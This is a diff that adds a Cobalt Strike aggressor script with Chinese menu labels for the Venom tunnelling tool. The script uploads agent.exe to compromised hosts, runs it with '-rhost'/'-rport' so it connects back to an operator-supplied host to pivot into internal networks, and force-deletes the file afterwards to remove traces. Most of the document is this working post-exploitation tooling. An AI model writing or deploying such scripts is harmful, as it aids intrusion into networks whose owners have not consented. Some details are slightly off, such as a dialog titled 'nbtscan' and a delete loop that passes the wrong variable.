@@ -1,0 +1,37 @@
+menu "内网穿透" {
+	menu "毒液Venom" {
+		item "上传毒液" {
+			$bid = $1;
+			$dialog = dialog("上传nbtscan", %(UploadPath => "", bid => $bid), &upload_venom);
+            dialog_description($dialog, "上传agent.exe到如下指定目录");
+			drow_text($dialog, "UploadPath",  "上传路径: "); 	
+			dbutton_action($dialog, "上传");
+			dialog_show($dialog);
+			blog($1, "-------------------------------------------------------------上传毒液---------------------------------------------------------------");
+		}
+		sub upload_venom {
+			bcd($bid, $3['UploadPath']);
+			bupload($bid, script_resource("/exe/agent.exe"));
+		}
+		item "运行毒液" {
+			$bid = $1['@'];
+			$dialog = dialog("运行毒液", %(bid => $bid), &run_agent);
+			dialog_description($dialog, "运行毒液");
+			drow_text($dialog, "ip", "ip:  ");
+			drow_text($dialog, "port", "port:  ");
+			dbutton_action($dialog, "确定");
+			dialog_show($dialog);
+		}
+		sub run_agent {
+			blog($bid, "-------------------------------------------------------------运行毒液-------------------------------------------------------------");
+			bshell($bid, "agent.exe -rhost $3['ip'] -rport $3['port']");
+		}
+		item "删除毒液" {
+			blog($1, "-------------------------------------------------------------删除毒液---------------------------------------------------------------");
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "del /f /s /q agent.exe");
+			}
+		}
+	}
+}
